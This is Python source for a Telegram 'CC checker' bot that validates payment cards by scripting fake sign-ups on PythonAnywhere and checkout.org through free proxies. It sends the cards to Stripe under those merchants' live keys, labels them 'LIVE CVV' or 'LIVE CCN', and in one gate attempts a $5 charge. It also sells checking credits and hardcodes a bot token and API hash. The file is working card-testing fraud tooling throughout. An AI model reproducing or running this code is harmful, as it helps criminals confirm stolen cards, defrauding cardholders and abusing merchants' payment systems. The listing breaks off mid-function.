from sqlite3.dbapi2 import connect
import requests
from lxml.html import fromstring
import json
import string   
import random
import sqlite3
from requests.models import Response
from telethon.client import buttons
from telethon.sync import TelegramClient
from telethon import functions, types
from telethon import Button
from datetime import datetime
from telethon import TelegramClient,events,sync
from telethon.tl.functions.users import GetFullUserRequest

conn = sqlite3.connect('database.sqlite3')
connector = conn.cursor()
premi = '''**Heyyyy you dont have to buy anything just you can enjoy our service only joining our community by @Team_CEX_official 


Bot Inspirartion ----> @TheAsukaXbot**'''

cmdi = '''Some command used to access meh...!

⚠️ BASIC COMMANDS ⚠️

➣ /premium --> Some of command only for premium users.
➣ /balance --> Here You can check You Current Balance.

⚠️ CHECKS COMMANDS ⚠️

➣ /sx --> Stripe Authenticati [PREMIUM]
➣ /sy --> Stripe Auth
➣ /sx --> Stripe Charged [PREMIUM]


'''
# try:
#     imp_data = list()
#     tyer = open('session.txt', 'r')
#     for i in range(0,4):
#         imp_data.append(str(tyer.readline()))
#     tyer.close()
#     api_id = str(imp_data[0])[:-2]
#     api_hash = str(imp_data[1])[:-2]
#     bot_token = str(imp_data[2])[:-2]
#     owner = int(imp_data[3])

try:
    api_id = str("1894041")
    api_hash = str("74ff54fe8c0a0eb9b04c0aa06f64ba9b")
    bot_token = str("1992330399:AAFjujfUlqlS2b8yMo1mS2lx_NI8ernCFaA")
    owner = int(1872698698)
    tyer = open('session.txt', 'w')
    tyer.write(str(api_id) + '\n' + str(api_hash) + '\n' + str(bot_token) + '\n' + str(owner))
    tyer.close()
except:
    None()

spam_holder = dict()
commands = ['/sx', '/sy', '/sp']
premium_commands = ['/sx', '/sp']
admincmds = ['./addpre', './rempre']
owner = [1872698698]

def bin_checker(bin):
        url = 'https://bin-checker.net/api/' + str(bin)
        gets = requests.get(url)
        jsoner = json.loads(gets.text)
        schme = (jsoner['scheme'])
        type = (jsoner['type'])
        country = (jsoner['country']['name'])
        bank = (jsoner['bank']['name'])
        bin_data = '\nSchme: ' + schme + '\nType: ' + type + '\nCountry: ' + country + '\nBank: ' + bank
        return bin_data

def free_gate1(list):
    def username(): # generating random usernames 
        generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)))
        return generated_email
    def email(): # generating random email_ids.
        generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 20))) + '@gmail.com'
        return generated_email
    def card(list): # slicing the card
        if len(list) > 26:
            cc = list[0:16]                   # card number
            cclf = list[12:16]                # last four digit of card number
            month = list[17:19]               # month of card
            year = list[22:24]                # year of card
            cvc = list[25:]                   # cvc of card
        else:
            cc = list[0:16]                   # card number
            cclf = list[12:16]                # last four digit of card number
            month = list[17:19]               # month of card
            year = list[20:22]    # year of card
            cvc = list[23:]                   # cvc of card
        return cc, cclf, month, year,cvc
    username = username()
    email = email()
    def proxy(): # getting free rotating proxies
        purl = 'https://free-proxy-list.net/'
        response = requests.get(purl)
        parser = fromstring(response.text)
        proxies = dict()                                            
        for i in parser.xpath('//tbody/tr')[:10]:
            if i.xpath('.//td[7][contains(text(),"yes")]'):
                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
                proxies['http'] = 'http://' + str(proxy)
        return proxies
    session_creator = requests.session()
    url = 'https://www.pythonanywhere.com/registration/register/custom/'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/registration/register/custom/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    post_data = {
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'email': email,
        'password1': 'password@123',
        'tos': 'on',
        'password2': 'password@123',
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    url = 'https://www.pythonanywhere.com/pricing/'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/pricing/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    post_data = {
        'csrfmiddlewaretoken': csrf,
        'daily_cpu_limit_seconds': '2000',
        'max_webapps': '1',
        'uwsgi_workers': '2',
        'max_always_on_tasks': '1',
        'disk_space_gb': '1',
        'postgres_disk_space_gb': '1',
    }
    url = 'https://www.pythonanywhere.com/start_custom_plan_upgrade/'
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    posts = str(posts.text)
    url = 'https://www.pythonanywhere.com/user/'+username+'/account/upgrade/payment_provider_choice/'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/'+username+'/account/upgrade/payment_provider_choice/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    post_data = {
        'csrfmiddlewaretoken': csrf
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    posts = str(posts.text)
    url = 'https://api.stripe.com/v1/payment_methods'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    post_data = {
        'type': 'card',
        'billing_details[name]': 'name',
        'billing_details[address][line1]': 'address1',
        'billing_details[address][line2]': 'address2',
        'billing_details[address][city]': 'city',
        'billing_details[address][postal_code]': '60064',
        'billing_details[address][country]': 'US',
        'card[number]': card(list)[0],
        'card[cvc]': card(list)[4],
        'card[exp_month]': card(list)[2],
        'card[exp_year]': card(list)[3],
        'payment_user_agent': 'stripe.js/369706cd7; stripe-js-v3/369706cd7',
        'time_on_page': '1138147',
        'referrer': 'https://www.pythonanywhere.com/user/jbghcvg/account/stripe_enter_card_data',
        'key': 'pk_live_ECdoUHKMCDhZOSh2bJLLfBGa'
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    posts = json.loads(posts.text)
    id = posts['id']
    print(id)
    url = 'https://www.pythonanywhere.com/user/'+ username +'/account/stripe_enter_card_data'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/'+ username +'/account/stripe_save_payment_details',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    print(csrf)
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/'+ username +'/account/stripe_save_payment_details',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'X-CSRFToken': csrf
    }
    url = 'https://www.pythonanywhere.com/user/'+username+'/account/stripe_save_payment_details'
    post_data = {'payment_method_id': str(id)}
    posts = session_creator.post(url=url, headers=header, json=post_data, proxies=proxy())
    posts = dict(json.loads(posts.text))
    responser = posts.get('error')
    if str(responser) == "The zip code you supplied failed validation.":
        relt = 'LIVE CVV ✅'
    elif responser == None:
        responser = 'Card Accepted.'
        relt = 'LIVE CVV ✅ OR CCN'
    elif str(responser) == "Your card's security code is incorrect.":
        relt = 'LIVE CCN ✅'
    else:
        relt = 'DECLINED ❌'
    ressum = '❇️ STRIPE AUTH' + '\nCC: `' + card(list)[0] + '`**|**`' + card(list)[2] + '`**|**`' + card(list)[3] + '`**|**`' + card(list)[4] + '`\nResponse: ' + str(responser) + '\nResult: ' + str(relt)


    return str(ressum + str(bin_checker(card(list)[0])))

def paid_gate2(list):
    charged = ''
    def username(): # generating random usernames 
        generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)))
        return generated_email
    def email(): # generating random email_ids.
        generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 20))) + '@gmail.com'
        return generated_email
    def card(list): # slicing the card
        if len(list) > 26:
            cc = list[0:16]                   # card number
            cclf = list[12:16]                # last four digit of card number
            month = list[17:19]               # month of card
            year = list[22:24]                # year of card
            cvc = list[25:]                   # cvc of card
        else:
            cc = list[0:16]                   # card number
            cclf = list[12:16]                # last four digit of card number
            month = list[17:19]               # month of card
            year = list[20:22]    # year of card
            cvc = list[23:]                   # cvc of card
        return cc, cclf, month, year,cvc
    username = username()
    email = email()
    def proxy(): # getting free rotating proxies
        purl = 'https://free-proxy-list.net/'
        response = requests.get(purl)
        parser = fromstring(response.text)
        proxies = dict()                                            
        for i in parser.xpath('//tbody/tr')[:10]:
            if i.xpath('.//td[7][contains(text(),"yes")]'):
                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
                proxies['http'] = 'http://' + str(proxy)
        return proxies
    session_creator = requests.session()
    url = 'https://www.pythonanywhere.com/registration/register/custom/'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/registration/register/custom/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    post_data = {
        'csrfmiddlewaretoken': csrf,
        'username': username,
        'email': email,
        'password1': 'password@123',
        'tos': 'on',
        'password2': 'password@123',
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    url = 'https://www.pythonanywhere.com/pricing/'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/pricing/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    post_data = {
        'csrfmiddlewaretoken': csrf,
        'daily_cpu_limit_seconds': '2000',
        'max_webapps': '1',
        'uwsgi_workers': '2',
        'max_always_on_tasks': '1',
        'disk_space_gb': '1',
        'postgres_disk_space_gb': '1',
    }
    url = 'https://www.pythonanywhere.com/start_custom_plan_upgrade/'
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    posts = str(posts.text)
    url = 'https://www.pythonanywhere.com/user/'+username+'/account/upgrade/payment_provider_choice/'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/'+username+'/account/upgrade/payment_provider_choice/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    post_data = {
        'csrfmiddlewaretoken': csrf
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    posts = str(posts.text)
    url = 'https://api.stripe.com/v1/payment_methods'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://js.stripe.com',
        'Referer': 'https://js.stripe.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    post_data = {
        'type': 'card',
        'billing_details[name]': 'name',
        'billing_details[address][line1]': 'address1',
        'billing_details[address][line2]': 'address2',
        'billing_details[address][city]': 'city',
        'billing_details[address][postal_code]': '60064',
        'billing_details[address][country]': 'US',
        'card[number]': card(list)[0],
        'card[cvc]': card(list)[4],
        'card[exp_month]': card(list)[2],
        'card[exp_year]': card(list)[3],
        'payment_user_agent': 'stripe.js/369706cd7; stripe-js-v3/369706cd7',
        'time_on_page': '1138147',
        'referrer': 'https://www.pythonanywhere.com/user/jbghcvg/account/stripe_enter_card_data',
        'key': 'pk_live_ECdoUHKMCDhZOSh2bJLLfBGa'
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    posts = json.loads(posts.text)
    id = posts['id']
    print(id)
    url = 'https://www.pythonanywhere.com/user/'+ username +'/account/stripe_enter_card_data'
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/'+ username +'/account/stripe_save_payment_details',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    }
    csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
    csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
    csrf = str(csrf[:csrf.find('";')])
    print(csrf)
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.pythonanywhere.com',
        'Referer': 'https://www.pythonanywhere.com/user/'+ username +'/account/stripe_save_payment_details',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'X-CSRFToken': csrf
    }
    url = 'https://www.pythonanywhere.com/user/'+username+'/account/stripe_save_payment_details'
    post_data = {'payment_method_id': str(id)}
    posts = session_creator.post(url=url, headers=header, json=post_data, proxies=proxy())
    posts = dict(json.loads(posts.text))
    responser = posts.get('error')
    if str(responser) == "The zip code you supplied failed validation.":
        relt = 'LIVE CVV ✅'
    elif responser == None:
        responser = 'Card Accepted.'
        relt = 'LIVE CVV ✅ OR CCN'
        url = 'https://www.pythonanywhere.com/user/'+username+'/account/non_eu_confirmation'
        csrf = str(session_creator.get(url, headers=header, proxies=proxy()).text)
        csrf = str(csrf[csrf.find('Anywhere.csrfToken')+22:])
        csrf = str(csrf[:csrf.find('";')])

        url = 'https://www.pythonanywhere.com/user/'+username+'/account/prepare_stripe_payment'
        post_data = {
            'csrfmiddlewaretoken':csrf
        }
        posts = session_creator.post(url=url, headers=header, json=post_data, proxies=proxy())
        posts = str(posts.text)
        striper = posts[posts.find('Anywhere2.handleStripeCardPayment')+60:]
        striper = striper[:striper.find("',")]
        print(striper)
        linker = striper[:striper.find('_secret')]

        url = 'https://api.stripe.com/v1/payment_intents/'+linker+'/confirm'
        header = {
            'accept': 'application/json',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        }
        post_data = {
            'setup_future_usage': 'off_session',
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'webauthn_uvpa_available': 'false',
            'spc_eligible': 'false',
            'key': 'pk_live_ECdoUHKMCDhZOSh2bJLLfBGa',
            'client_secret': striper,
        }

        posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
        print(posts.status_code)
        try:
            messa = json.loads(posts.text)
            charged = str(messa['error']['payment_intent']['last_payment_error']['message'])
        except:
            print(posts.text)
            charged = '\nCHARGE OF 5$ SUCCESSFUL.'
    elif str(responser) == "Your card's security code is incorrect.":
        relt = 'LIVE CCN ✅'
    else:
        relt = 'DECLINED ❌'
    ressum = '❇️ STRIPE CHARGE' + '\nCC: `' + card(list)[0] + '`**|**`' + card(list)[2] + '`**|**`' + card(list)[3] + '`**|**`' + card(list)[4] + '`\nResponse: ' + str(responser) + '\nResult: ' + str(relt) + '\nCharge: ' + charged

    
    return str(ressum + str(bin_checker(card(list)[0])))

def paid_gate1(list):
    def username(): # generating random usernames 
        generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)))
        return generated_email

    def email(): # generating random email_ids.
        generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 20))) + '@gmail.com'
        return generated_email

    def card(list): # slicing the card
        if len(list) > 26:
            cc = list[0:16]                   # card number
            cclf = list[12:16]                # last four digit of card number
            month = list[17:19]               # month of card
            year = list[22:24]                # year of card
            cvc = list[25:]                   # cvc of card
        else:
            cc = list[0:16]                   # card number
            cclf = list[12:16]                # last four digit of card number
            month = list[17:19]               # month of card
            year = list[20:22]    # year of card
            cvc = list[23:]                   # cvc of card
        return cc, cclf, month, year,cvc

    username = username()
    email = email()

    def proxy(): # getting free rotating proxies
        purl = 'https://free-proxy-list.net/'
        response = requests.get(purl)
        parser = fromstring(response.text)
        proxies = dict()                                            
        for i in parser.xpath('//tbody/tr')[:10]:
            if i.xpath('.//td[7][contains(text(),"yes")]'):
                proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]])
                proxies['http'] = 'http://' + str(proxy)
        return proxies


    session_creator = requests.session()
    url = 'https://checkout.org/account/signup?returnurl=https%3A%2F%2Fcheckout.org%2Fmembership%2Fsignup'
    header = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.org',
        'referer': 'https://checkout.org/account/signup?returnurl=https%3A%2F%2Fcheckout.org%2Fmembership%2Fsignup',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
    posts = session_creator.get(url=url, headers=header, proxies=proxy())
    csrf = str(posts.text)
    csrf = csrf[csrf.find('_csrf')+28:]
    csrf = csrf[:csrf.find('" />')]
    print(csrf)
    
    post_data = {
        'username': username,
        'password': 'svbadyhadvhv',
        'email': email,
        '_csrf': csrf
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    url = 'https://api.stripe.com/v1/tokens'
    header = {
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
    post_data = {
        'card[name]': 'name kumar',
        'card[address_line1]': 'address1, address2',
        'card[address_line2]': 'address2',
        'card[address_city]': 'North Chicago',
        'card[address_state]': 'IL',
        'card[address_zip]': '60064',
        'card[address_country]': 'US',
        'card[number]': card(list)[0],
        'card[cvc]': card(list)[4],
        'card[exp_month]': card(list)[2],
        'card[exp_year]': card(list)[3],
        'payment_user_agent': 'stripe.js/8c6f8685b; stripe-js-v3/8c6f8685b',
        'time_on_page': '1223977',
        'referrer': 'https://checkout.org/',
        'key': 'pk_live_q6LDEL2Kt46unBXu6pqGs6X1',
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    id = json.loads(posts.text)['id']
    print(id)
    url = 'https://checkout.org/membership/signup'
    header = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://checkout.org',
        'referer': 'https://checkout.org/membership/signup',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36'
    }
    posts = session_creator.get(url=url, headers=header, proxies=proxy())
    csrf = str(posts.text)
    csrf = csrf[csrf.find('_csrf')+28:]
    csrf = csrf[:csrf.find('" />')]
    
    post_data = {
        'shipping-name': 'name',
        'shipping-line1': 'address1, address2',
        'shipping-line2': 'address2',
        'shipping-zip': '60064',
        'shipping-city': 'North Chicago',
        'shipping-state': 'IL',
        'billing-country': 'US',
        'billing-name': '',
        'billing-line1': '',
        'billing-line2': '',
        'billing-zip': '',
        'billing-city': '',
        'billing-state': '',
        'card-token': str(id),
        '_csrf': csrf,
        'paymentSettingId': '',
        'returnUrl': '',
    }
    posts = session_creator.post(url=url, headers=header, data=post_data, proxies=proxy())
    try:
        responser = dict(json.loads(posts.text)).get('message')
    except:
        responser = posts.text
    if str(responser) == "The card's zip code failed validation.":
        relt = 'LIVE CVV ✅'
    elif str(responser) == 'Internal Server Error':
        relt = 'LIVE CVV ✅ OR CCN'
    elif str(responser) == "The card's security code is incorrect.":
        relt = 'LIVE CCN ✅'
    else:
        relt = 'DECLINED ❌'

    ressum = '❇️ STRIPE AUTH' + '\nCC: `' + card(list)[0] + '`**|**`' + card(list)[2] + '`**|**`' + card(list)[3] + '`**|**`' + card(list)[4] + '\nResponse: ' + responser + '\nResult: ' + relt

    return str(ressum + str(bin_checker(card(list)[0])))

def free_gate2(iban):
    url = 'https://www.iban-test.eu/ajax.php'
    header = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.iban-test.eu',
        'referer': 'https://www.iban-test.eu/',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36'
    }
    post_data = {
        'auth': '0ca1cec4166833dd0c06bb2a0dfe0c1b',
        'function': 'ajax_check_iban',
        'iban': str(iban),
    }
    posts = requests.post(url=url, headers=header, data=post_data)
    posts = str(json.loads(posts.text)['message'])
    return posts


start_msg = """Heyy here welcome.... I am The Acrid... An anime based CC checker bot
made by @Thunder_king_xd
You can enjoy My free Features or Use premium by doing  `/premium`"""









client = TelegramClient('bot', api_id, api_hash).start(bot_token= bot_token)
@client.on(events.NewMessage)
async def my_event_handler(event):
    # try:
    #     newfile = sqlite3.connect("CREATE AUC.db")
    #     c = conn.cursor()
    #     c.execute("""CREATE TABLE UAC (
    #         USER_ID integer,)
    #         """)
    #     conn.commit()
    #     conn.close()
    if event.raw_text == '/premium':
        await event.reply(premi, buttons=[
            [Button.url('Join Rxs', 'https://telegram.me/redxskullchecks')]
        ])
    if event.raw_text == '/start':
        await event.reply(start_msg)
    if event.raw_text == '/cmds':
        await event.reply(cmdi, buttons=[
            [Button.url('Join Rxs', 'https://telegram.me/redxskullchecks')]
        ])
    else:
        ssender = []
        gsender = []
        premium_users = []
        connector.execute("SELECT USER_ID FROM UAC")
        userr = connector.fetchall
        for i in connector:
            i = str(i)[1:-2]
            premium_users.append(int(i))

        try:
            sender = int(event.peer_id.user_id)
            ssender.append(sender)
        except:
            sender = int(event.from_id.user_id)
            gsender.append(sender)
        print('check1')

        if (((sender in ssender) or (sender in gsender)) and (sender in owner)) and str(event.raw_text[0:8]) in admincmds:
            if event.raw_text[0:8] == './preadd':
                print('check2')
                towwbpuiss = str(event.raw_text[9:])
                towwbpuis = int(towwbpuiss[:towwbpuiss.find(' ')])
                print(towwbpuis)
                credits = int(towwbpuiss[towwbpuiss.find(' ') + 1:])
                print(credits)
                print('check3')
                if towwbpuis in premium_users:
                    connector.execute("DELETE FROM UAC WHERE User_Id = {}".format(towwbpuis))
                    conn.commit()
                connector.execute("INSERT INTO UAC VALUES ({}, {})".format(towwbpuis, credits))
                conn.commit()
                await event.reply('**USER_ID: ' + str(towwbpuis) + '\nCREDITS: ' + str(credits) + '\n\nPremium user added successfully.**')
            elif event.raw_text[0:7] == './prerem':
                towwbpuis = int(event.raw_text[8:])
                print('check4')
                connector.execute("DELETE FROM UAC WHERE User_Id = {}".format(towwbpuis))
                conn.commit()
                print('check5')
                await event.reply('**USER_ID: ' + towwbpuis + '\n\nPremium user removed sucessfully.**')

        elif (((sender in ssender) or (sender in gsender)) and (sender in owner)) and str(event.raw_text[0:3]) in commands:
            if str(event.raw_text[0:3]) == '/sx':
                list = str(event.raw_text[4:])
                response = str(paid_gate1(list))
                print('check6')
                await event.reply('**' + response + '**')
            elif str(event.raw_text[0:3]) == '/sy':
                list = str(event.raw_text[4:])
                response = str(free_gate1(list))
                print('check7')
                await event.reply('**' + response + '**')
            elif str(event.raw_text[0:3]) == '/sp':
                list = str(event.raw_text[4:])
                response = str(paid_gate2(list))
                print('check7')
                await event.reply('**' + response + '**')
            

        elif (((sender in ssender) or (sender in gsender)) and (sender in premium_users)) and str(event.raw_text[0:3]) in commands:
            current_cmd = str(event.raw_text[0:3])
            full = await client(GetFullUserRequest(sender))
            name = str(full.user.first_name)
            userid = str(sender)
            print('check8')
            connector.execute("SELECT * FROM UAC WHERE USER_ID='"+str(sender)+"'")
            tupp = str(connector.fetchall())
            crediter = int(tupp[tupp.find(',')+2:tupp.find(')')])
            print('check9')
            list = str(event.raw_text[4:])
            if len(list) > 24:
                try:
                    if current_cmd == '/sx':
                        if crediter>=5:
                            charge = 5
                            replyer = await event.reply('**Please Wait Checking Your Card ....⌛**')
                            response = str(paid_gate1(list))
                            await replyer.edit('**Please Wait Checking Your Card ....⌛⌛**')
                            accounter = '\nChecked by **' + f"[{name}](tg://user?id={userid})" + '**\nREMAINING CREDITS: ' + str(crediter-charge)
                            print('check10')
                            await replyer.edit('**Please Wait Checking Your Card ....⌛⌛⌛**')
                            await replyer.edit('**' + response + accounter + '**')
                            connector.execute("UPDATE UAC set CREDITS = {} WHERE USER_ID = {}".format(str(crediter-charge), str(sender)))
                            conn.commit()
                        else:
                            await event.reply('**You do not have sufficient credits to use this gate. \n\nTo buy more credits contact **' + f"[{'Electron'}](tg://user?id={'1788856187'})" + ' or ' + f"[{'Mayvid'}](tg://user?id={'1476503457'})")
                    elif current_cmd == '/sp':
                        if crediter>=5:
                            charge = 5
                            replyer = await event.reply('**Please Wait Checking Your Card ....⌛**')
                            response = str(paid_gate2(list))
                            await replyer.edit('**Please Wait Checking Your Card ....⌛⌛**')
                            accounter = '\Checked by **' + f"[{name}](tg://user?id={userid})" + '**\nREMAINING CREDITS: ' + str(crediter-charge)
                            print('check10')
                            await replyer.edit('**Please Wait Checking Your Card ....⌛⌛⌛**')
                            await replyer.edit('**' + response + accounter + '**')
                            connector.execute("UPDATE UAC set CREDITS = {} WHERE USER_ID = {}".format(str(crediter-charge), str(sender)))
                            conn.commit()
                        else:
                            await event.reply('**You do not have sufficient credits to use this gate. \n\nTo buy more credits contact **' + f"[{'Electron'}](tg://user?id={'1788856187'})" + ' or ' + f"[{'Mayvid'}](tg://user?id={'1476503457'})")
                    elif current_cmd == '/sy':
                        replyer = await event.reply('**Please Wait Checking Your Card ....⌛**')
                        response = str(free_gate1(list))
                        await replyer.edit('**Please Wait Checking Your Card ....⌛⌛**')
                        accounter = '\nChecked by ** ' + f"[{name}](tg://user?id={userid})" + '** [PREMIUM USER]'
                        print('check22')
                        await replyer.edit('**Please Wait Checking Your Card ....⌛⌛⌛**')
                        await replyer.edit('**' + response + accounter + '**')
                        print('check21')
                except:
                    response = '**An Error Occured. \nPlease try again after some time.**'
                    await event.reply(response)
            else:
                await event.reply('**Please enter the card info in correct format.**')
        elif (sender in gsender) and str(event.raw_text[0:3]) in commands:
            current_cmd = str(event.raw_text[0:3])
            user_in_channel = []
            async for user in client.iter_participants('RxsBotUpdates'):
                user_in_channel.append(user.id)
            if sender in user_in_channel:
                try:
                    full = await client(GetFullUserRequest(sender))
                    name = str(full.user.first_name)
                    username = str(full.user.username)
                    userid = str(sender)
                    list = str(event.raw_text[4:])
                    if len(list) > 24:
                        if current_cmd in premium_commands:
                            await event.reply('**You must be a premium member to access this gate. \n\nStill you can check via free gates.**')
                        elif current_cmd == '/ib':
                            now = datetime.now() #finding current time
                            current_time = int(now.strftime("%H")) * 3600 + int(now.strftime("%M")) * 60 + int(now.strftime("%S")) #converting the time to second by multiplying hour with 3600 + minutes with 60 + seconds.
                            checker = spam_holder.get(str(sender))
                            print(checker)
                            if (checker == None) or (current_time - checker > 60):
                                response = str(free_gate2(iban=list))
                                spam_holder[str(sender)] = current_time
                                await event.reply('**Valid iban**')

                        elif current_cmd == '/sy':
                            now = datetime.now() #finding current time
                            current_time = int(now.strftime("%H")) * 3600 + int(now.strftime("%M")) * 60 + int(now.strftime("%S")) #converting the time to second by multiplying hour with 3600 + minutes with 60 + seconds.
                            checker = spam_holder.get(str(sender))
                            print(checker)
                            if (checker == None) or (current_time - checker > 60):
                                replyer = await event.reply('**Please Wait Checking Your Card ....⌛**')
                                response = str(free_gate1(list))
                                await replyer.edit('**Please Wait Checking Your Card ....⌛⌛**')
                                accounter = '\nChecked by ** ' + f"[{name}](tg://user?id={userid})" + '** [FREE USER]'
                                print('check22')
                                await replyer.edit('**Please Wait Checking Your Card ....⌛⌛⌛**')
